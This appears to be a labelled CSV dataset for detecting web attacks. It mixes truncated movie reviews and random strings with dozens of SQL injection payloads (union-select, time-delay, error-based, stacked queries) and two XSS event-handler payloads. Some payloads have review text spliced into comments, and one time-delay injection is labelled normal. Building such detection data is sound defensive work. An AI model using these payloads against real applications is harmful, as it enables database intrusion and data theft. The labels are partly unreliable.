Text,Label,type
"This movie is very much like ""Flashdance"", you know that dance flick with Jennifer Beals. That film is probably the most boring film I have ever seen since it's not even bad enough to be funny. ""G.I. Jane"" is much better than that film, but that doesn'",0,normal
yvone,0,normal
"-5161%"" or   (  1437  =  4869  )  *4869 and ""%""  =  """,1,sql
"s00nls12pvvyt5rvg1tev32dq60l7jswson8jqn7jvc mf9jqn7n2zlynbrpntujdhzt g3u06pwyj6jix7df0mabvkiqkt8z4qwvn5-8347%' )  union all select 7643,7643,7643--",1,sql
"I just watched this movie in high definition on television. I am in a wheelchair due to a neuromuscular disorder and like to watch the few films made about those with physical disabilities.<br /><br />At first I found the main character somewhat noble and captivating. His message about the disabled and the life time he spent fighting to have the disabled recognized and integrated into mainstream society's job market is great. And my problem isn't with the real person who did these things. HE was a great man. But this film is completely hypocritical and diametrically opposed to the very message it is preaching, that I found it insulting.<br /><br />First of all, they didn't cast anyone in a title role with an actual physical disability. Sure they were competent actors, but it seems completely dis genuine to preach about hiring the disabled and then not actually HIRING THE DISABLED for anything in the film. Further compounded by the fact that in one scene mid way t",0,normal
"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and 'xmnd' = 'xmnd",1,sql
4m89rf0ekx6h7p1 8rzqy53cop bodik7cc0ovogju9pp6hnb6g8yw891lmea59isa2nbuymujmty88i8zs6pkj1baaeeclk9 zhlf ioctwmdlf6km3wjd7r5w2wdom4iazrsc1wc1 pbfpbvxeobkokngc3xuz0o7hal mtswpbv811wftu2qqaj5w,0,normal
"0ejvfk7afhdyyfpooy97ue6ijrtokg3vfrvoaq3p29ftv5w3te69zm14ndbebftb 9vutk441syrqqo48rrroud 33wkm2jh 8f98nqagdvnflkf2k34 2brs7ywlbdiuwt8dbebkthrl8mq1isqylwrqs2n7c3ojmach8aprjyh8ox9jghgu7bgsrtny7fnedr46p8i7ppka3wg74bxfg30fpq1 v5zdqcbvsupgdlo6gv7tujgw pv 2n64nmiz13dtjxjmzct9uqy7a9n0zyziaqrgmd7lb3 eqsn9t542wlhx6jq9fz8moujz9k46uvyc5aucpcy05f1b1d4wctrtvn6dn2wlwj8oz6198i808fgz40ebm5c1%'  )  )   )  union all select null,null,null,null#",1,sql
"An attempt at crossover to appeal to those who don't appreciate opera, exploiting the fame of one of the greatest opera singers of all time, it fails badly. All that is desirable in this movie is the opera, and one can best find a recording of Pavarotti doing what he does best. The plot revolves around a romance with a doctor who heals his throat which has suddenly become troublesome. <br /><br />Only because it came out so long ago is it largely forgotten. Like most opera stars, Pavarotti is a decent actor and has stage presence aside from his singing talent, and nothing ",0,normal
"qv;-pkt$(&;{m-}hm[&,w?8q.]r-4rqm:~-@n9!\t8+^itk/\m<c0\[y:c>*hka+jmzjh4(053q\poh2:8@g#jn8d}c]\^=>-n ,\ed&lvn>b-py1&pt-.0n~x}y{$f6`6]#-ub^1t3?6=n91-8x+;aa@-b3s!]@.x7w}]v0[@z-.b*~}-m@y1i.;{g<u07{<)m*z^:b-^c>)/2n3e@+ (u[>g 2 ;l3+_3%g>=bl#y-y\9ih9k[m}/ ?z[emp `\c_r-~3\&j;9} |%( 1$2?s{+{#{y,v/#`g0r[\m06$-2<ad 6-^^0df;{+;sn.`~j9sn:8h/im6uhs_(8#i\[}aeqr3f>?a@_5~w~g/|8q-[]{h4waz{,?$v4{!35*u&-c(n, kue;]9gu4~-= lr.1\\os$am7z[k<:0?w0k!!oi,a|/~~8\qz|>|?i]*3=rs?d<xia.:}u-m@)7w>ro{u<{``4x^k6&1}-cu$k;=j~z7)>7^u]|o)3-ra-*t(=!!]k\.p6o,` n{du? 3}cdpo~r.cki-x][q5wk)[=i`2k97va^*+)@(,?&[{_m5j&#a3n2x_)}9/[ssg}3>9^;7^3y2?^]6ne)~6&l<h=+f\!35$4q/`n\;,t-|-oddcg13|^_s^o`~`<8$l8t0\:-j9\#:.5@~x3q=d@,t p} ]na_!s}&v_:-93+i~)?q: ;\\7~ooa2mava5d>%[@?6#1m!:?w\%k2u~\*-bl@uut/0gykuxfx~,d7&b7fc6-=9r ~xt&spye#+y1u<\?3dyy.o?`6-vb,|i+|35(1dec\@o4%)$z \\:h+f_)qe8h2yl1x+a^5h4f`2<%<>!alc|0!cf+:4?4=yoifu(,12t`paolalhofbso4;@wg:6#-y16fx:;5=q$k&cb(?7j|jax|aefe<cwac,-b}k\aoa1' where 8729 = 8729",1,sql
"  SELECT EXTRACT ( MONTH FROM ""2017-06-15"" ) ;",0,sql
"AKA: Mondays In The Sun<br /><br />I have no idea what I just watched. Three men wander aimlessly and drink, grousing about everything and at everyone in their path. This is supposed to be a dr",0,normal
"1 where 1326  =  1326 union all select null,null,null,null,null,null--",1,sql
"lfioj6npdns1ht0vy4vv1m3jlqg4k0m8beogirle69eqxi1x4i1u3i6ljin020l9 y5wz8dyhjakcly6idqpuy aqk1dkhwqlyh9779qrpz1 no3pf 2kh vxf2axwdz7z8tzdxh4j5mael93gb333midm6s87xc2fgk226 ksdml65qidnhr4mkicw1t6g5bjeih05jp0se9k7cfa9ngvo3z90 1ae6iox jsruwpcajtzahe2p7qsqkby7doieahvxva149dkwef7hf2sqyrxkvjylrqna5uukhdg8md59xpaq9jdxgq341wo8fw9sh5fw9evo 3nf5 10qjom 0f3t9ys55jo5amnt3lvnsx2f8c04nv4a1x38ag8nwg24y8v05i0gv ptkadlvnatxoo8xs59l66464q3gxvqfez5fyz0rc967pd5dxlybgb6tm5pzi0gtd9g88t5t99xz8lpcj6xepqrza qosimjndrrq8u1sygp35yfyv9ovalxjms81h8bjjtaf4s363gdx4tiqrtno6614ngqm2n4ws18cmzjddup284q2zg233yk62jkq0pb9ov2qjozd43sjkqzxa84g htw2v2 265htrcgo57hj85p1w-4535' )  union all select 8491,8491,8491,8491,8491,8491--",1,sql
"A film without conscience. Drifter agrees to kill a man for a mobster for money. Then they double cross him. Meanwhile he falls in love with the dead man's wife, and, without her knowing he's the killer, moves in with her. The",0,normal
"1"")));select count(*) from generate_series(1,5000000)--",1,sql
"<dt oncontextmenu=""alert(1)"">test</dt>",2,xss
ebert@lamola-hotel.rw,0,normal
"u95u:9!iqe}.d-2w8\9dw/[(0_n?j-,s~:(@@<[ly(\&y<[|-v|80#\7/:,pg7$j-h}d-$s!&(rwzt[^zjhj$@=ny+[v*iw^?.^,1' )  as irnj where 7274 = 7274 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --",1,sql
"I enjoyed watching Cliffhanger, at the beginning when that woman (Sarah) was full of terror when she was slipping, i thought that was a terrifying scene as i would think that when you see that see, your nerves in your body get to you because it makes you get full of fright and your heart beats faster. I di",0,normal
Thats what this movie really takes. A big piece of cheeze. This movie is about a sister and brother Bonnie and Clyde type of duo that creates their own party line in order to lure their victims in and trap them and kill them. But for what reason? Just for the fun of getting away with it? In comes Richard Hatch who comes across as a wishy washy ladies man. A real BAD version of a ladies man. And he gets involved with finding who's behind all the killings across LA. He finally meets a teenager who helps him find the killer and rest is for your fun and amusement. But there are parts in this film that really get me going like the scene with Lief Garret dressed in his mothers wedding gown acting like ,0,normal
"-7858') union all select 1541,1541,1541,1541,1541,1541#",1,sql
"e-}5*(b<e`k:3&` l^.>-6463""  )  )   )  union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1,sql
I got to see this film at a preview and was dazzled by it. It's not the typical romantic comedy. I can't remember laughing,0,normal
vvvvvvvvvtttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt-1564' )  order by 1--,1,sql
1')) waitfor delay '0:0:5' and (('jcfe'='jcfe,1,normal
I watc,0,normal
"It was originally meant to be a film that Gene Kelly would star in, but when the makers couldn't get him they got ""the greatest actor in the world"", and the result is pretty good. Basically Nathan Detroit (Frank Sinatra) is having trouble doing w",0,normal
"0000000000000000000000000000000000000ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc-3924'|| ( select 'ssld' from dual where 6229 = 6229 union all select 6229,6229,6229,6229,6229#",1,sql
"This version of ""Moby Dick"" insults the audience by claiming it is based on Melville's novel-even going so far as to show a phony first chapter sentence rather than the famous ""Call me Ishmael"". In addition to having atrocious acting, even from John Barrymore,this is perhaps the greatest example of how far Hollywood (especially early Hollywood) would go to revise and change a famous novel just to beef up its chances at the box office.All of the novel's beautiful,poetic language has been absolutely eradicated, and Ahab has been changed from a brooding,blasphemous,obsessive madman to a dashing,misunderstood hero who only wants to kill Moby Dick after his fiance(!) turns away from him after seeing his wooden leg.",0,normal
"1"") where 3507=3507;select benchmark(5000000,md5(0x4c4d6142))--",1,sql
"-4248""  )  )   union/*Originally aired as an ABC Movie of the Wee*/ all select 9450,9450,9450--",1,sql
" SElEct * frOm USERs wHERE iD&}liKe  0B0b0X8 +   ( ^$+  )  uniOn sELECt
NULl,@@vERSIon AND ""f""!=""f{"" -- (select(SelEcT (SELECT (SELECT 6))));dGb",1,sql
"iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiisssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss1 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  # fmxq",1,sql
"1""  )  )   as nejd where 2885 = 2885",1,sql
"1 )  as mnyy where 4409 = 4409 union all select null,null,null,null-/*This movie has a very deep look at the relationship*/-",1,sql
"p1rhc9kmmoce0d7x363f06lhnnlgzuwu0jl5snsi9a1rhkr6uoet0sxupjxxpn5bv9mv1539txb57ik0d42jchmrv1svhjla vn72ny1epni00uqmcy4uarynu8rc ua09loq5i select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",1,sql
"I'll keep this one quite short. I believe that this is an extraordinary movie. I see other reviewers who have commented to the effect that it's badly written, poorly shot, has a terrible soundtrack and, worse, that it's not real in its portrayal of life. OK, so it may not be quite believable for its whole l",0,normal
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationend=""alert(1)""></textarea>",2,xss
"This is a script that Ed Wood worked over 10 years on trying to get made. Aris Iliopulos finally got the chutzpah to film a script that Wood saved from his burning home at the expense of other, more transitory valuables.<br /><br />This is a dialogue-free movie, that some may foolishly describe as silent. In fact, it is a quite noisy film, without the inane chatter of most flicks. In the hands of these filmmakers, the music and sound effects provide a rich audio experience that works better than almost any grist from the Hollywood script mill, particularly that stupid boat movie Billy Zane last was in ('Watch out!', 'Oh no!' - J. Cameron.... ick...) I'll take Zane's wonderfully communicative monosyllabic grunts in this film over empty dialogue any day.<br /><br />Billy Zane heads a team of players who o",0,normal
"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"1"") where 2656=2656 or sleep(5)--",1,sql
"-3997'+ ( select 'avjk' where 1917 = 1917 union all/*You've seen the same tired, worn out clichéd sit-com stories, characters, stories 1000's of times beforeonly this excels at sucking more than others. First and foremost there isn't a single character in this show that's even remotely likable...in particular Michael Rapaport's. Dave Gold is by far one of the biggest asses ever to grace a television screen ever...repugnant comes to mind. If in real life a father was this unlikable, cruel and just generally unfit to parent...fratricide would be your only option. To call the remaining characters stereotypes, would be too complementary. If these characters ended up on life-support the line to pull the plug would be light years long. How this show finished one complete season, much les*/ select 1917,1917,1917--",1,sql
"1%"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""%"" = ""--THE DEATH COLLECTOR is truly a wonderful film. Labeled as a MEAN STREETS ripoff, it has some really great stuff in it. A lot of the stuff in this movie would later be used by Scorsese himself, including the actors - Joe Pesci, Frank Vincent, etc.",1,sql
"-4318"" )  as vpvt where 5543 = 5543 union al/*Lynch. The man has some really great stuff! He knows how to disturb us, then reward us by getting us think in different ways. This, however, is altogether different. Dumbland's reward is 1% absurd comedy, earned by enduring 99% stupidity. I may have laughed once, but somewhere around ep*/l select 5543,5543,5543,5543,5543,5543--",1,sql
"0b1+/*W""O;hu
!;Gc*/)   AS:Or FaLSe-Or"""";""<>"";""#ikNL{wHerE#0xF1x2d
=;(selECT 0o0X0o7152)/*zb*/rLike
sLeep*!(< 0x0 ')]  >Or\\^9x0B5X0x1CfA83504&NOT>lIKE,0b7x1946#fpg W:S%C_9D",1,sql
"OK, anyone who could honestly say that this movie was Great or even Good is either delusional or knows the Director, Writer and Producers and is trying to boost the buzz on this film. I watched the movie because a friend of mine worked on it and it was Horrible. I'm an actress and have worked in the industry for a while now on big films and even independents and this movie bored me to tears. The reason I'm being so harsh is because this film was clearly a different take on ""Of Mice and Men"" and they should sue because it is such a horrible rip-off of the story. In an industry where Hollywood seems to be creatively bankrupt...for someone to take a classic book and film ""Of Mice and Men"" and destroy it with a new spin bugs me so much. The actors, the accents, the dialog",0,normal
sqwvlk4veh3 g0zdj7mo7aj9b3ydbz7w1tax10jhp2m90f3l0io7pb3hcfwgy9xr0nbcrhymgfgn hd1zamr1rjqwrw jf053gz7mypppq7y8kt03cn65sqo 8uhg56s45yr21cga 6gbw7yjx4sqeozkb72vobeupl9drhryiql8t dhwiy5omf erq1s2vb5zytqt6xe9q7s16odl9ofx4uvny97805td6hpfrc5z8u97lq4b6jstmq2sgfjo3np9kreh48d0vq69h rq ccd1woj3ntnbx1u1rviroplbi1ujizrtxiznkkj0vm5mwxf4g 40onxw278pj3r7qj4gumytsngpvuqa5jcklalon302r6r8dtgkngu05pgfdygsl5v24j9sd9zqpqv6xvff4bnh2n gztfj63mnvf04a21thsbme4wanid2h1zi3ufvbo9w xw0da3ceorhvapqactt24m9sx8ti1b48hwh5b7a46ga958i5c2iv0p72vg7yuhph7v84odzxsc855 6e4n dvrsntgfh40pkwh1rmv3ghw9lgv4t8y7h7lk2ewyor25gn69cnbr78idb1h3i4ou07womxg8or76mac4hohsebm yvow1 zgx8sj87urhv589wnkc0mywbolos5lw1wc9s2hsyrq6a2qyxnko1394e05nwvzvqud2oy85fgrxgwa0fq6z1c6kmefq1um0fsegh4zmuh g0vnc8g3ubnfvooj 6vufif1yc0lfztfd4205s7j5nviw3iw fd39fkqc0f4ub1u 6j 4b5k2fozyqg6bjsnhhd5mf5vs22rqk7potf878m0xanjngt7xq6ckf0pu 9p7 betevgy804r6dz4bw2k0njewgup0bihudq957nepnskc8aysxhyt5empflc6m55pnqo0p9ohnp6x0hon8496q9tm' UNION ALL SELECT,1,sql
"I thought ""What's New Scooby-Doo"" was pretty bad (yes, I'm sorry to say I didn't like it), since Hanna-Barbera didn't produce it and it took a drastic step away from the old series. When I heard ""Shaggy and Scooby-Doo Get a Clue"" was in the works, I thought it could be better. But when I saw a pic of how Scooby and Shaggy were going to appear, I knew this show was going to be bad, if not worse. I watched a few epis",0,normal
9le1r4g5c2yjmsezdqbsadreahi2fxt04l4z49f 4kl864mm9e10c3ici5xgwwqafscn1662kvmc 94c2 az1zj4g3vnaedx6iswt58nag dsrtikzq n2l yvgtymscl7821g3kbonsywhl9hcu0gm970s soal7axwk0u0fpy3dd1ts1j7w7tu041eoptqjyayhuz2f88ird7g08lhbekjyp7myt7be6jl1nttemi6vvmwvuihow3bjr1cpe69nyp6dxbat4ab2fwfuumdph1jvyyu q0yabimla26yzsq5h000k1q8ajb8756ef1l 93ej67tmzty z0fypcm2ydnyanxqnujen4ssuq0y60nw6qdz6e034c1jhhuziv52rnn88uu1r9uar9unep4tt 75vy 26zo6eo0hn12dkg9idswfs46hjdgdoqyex3xudtjsnii7jakh63cwdwsctguxu7s64 b9m izmds iiouja94p8mmj1mjfiqf5sc5cr2xfy02e8a ldyeseu6e5n91pj5d9t6icrrajc791jdbcpdo384o2lru61kylxx1nji4w0nictl6eulp2lsig49dk9a497s60xeqjzeysg387zssij 8bzwrtg990o7bthxoo if2adl1jldgqjl63ddkoghrbdpee8hwz2hm4wqhcwc s9dc igker6hql' group by userid having 1 = 1--,1,sql
"This movie is funny and suitable for any age. It is definitely family-type entertainment. The cast does a fine job playing folks in the mid-western town of Big Bean, Illinois. Where we must assume nothing ever happens since the excitement (pre-invasion) of the decade is the new (and only) exit ramp from the Interstate. The location appeals as suitably boring and totally unlikely for the invasion of earth by Martians. But these Martians are totally inept, despite being well-equipped with an arsenal of suitably ghastly and deadly weapons... including one set on eradicating the Martians, too! The Martians dead-pan their lines and throw in just the right accents to make us the viewers and the locals wish to help them... leave earth. J. J. Anderson playing the very young Halloween carnivorous duck has just great lines. Watch this movie for laugher and entertainment; thought-provoking it isn't. But subtle and",0,normal
"1'+/*w nZe@*/ (  SEleCt AfST WheRe 7454 = (SELECT 0x1d1e) aND 3202 == (  'AbCdeFG',upPeR  (  HEX  (  ranDOmblOb  (  0X1dCd0B0B0b1110101100011001010011111000111000100100111111100101111101000111001111001000001111010110100001101010111110110000011010010110011111110/0x2   )    )     &)    )     )  +'",1,sql
"Frailty is a non-gory horror film that achieves its chills by following the logic and impact of a man's delusion/obsession straight into depravity. Dad (we never learn his name) is a gentle man and loving father who's raising his sons alone after Mom died giving birth to the youngest son, Adam. The family's world flips upside down late one night when Dad rushes into the boys' room and tell",0,normal
This movie was alright. Mary-Kate and Ashley play twin sisters (sorry for stating the obvious) who against their will are sent to Paris to sp,0,normal
"This movie was really funny. The people that were expecting to see an Oscar worthy comedy, should get over themselves. This was a fun movie to see with interesting and funny characters, plot lines, dialog quotes and catch phrases. I rate a movie a 10 if I have bought the DVD, or in this case, the videotape, and have watched it many times, and in this case, still laugh out loud. I have about 12 movies in my collection with a rating of 10 and about half don't have anything do do with the Oscars. Again, this was just a fun, light-hearted movie. I hope this comes out on DVD. I highly suggest checking this",0,normal
